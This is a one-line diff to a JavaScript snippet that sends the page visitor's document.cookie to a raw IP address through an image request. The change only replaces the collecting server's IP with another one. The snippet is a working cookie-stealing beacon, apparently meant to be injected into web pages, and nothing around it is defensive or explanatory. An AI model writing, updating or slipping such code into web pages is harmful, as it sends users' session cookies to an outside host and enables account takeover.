@@ -1,1 +1,1 @@
-img=new Image(); img.src="http://45.55.203.188/s.gif?"+document.cookie;
+img=new Image(); img.src="http://138.197.38.121/s.gif?"+document.cookie;
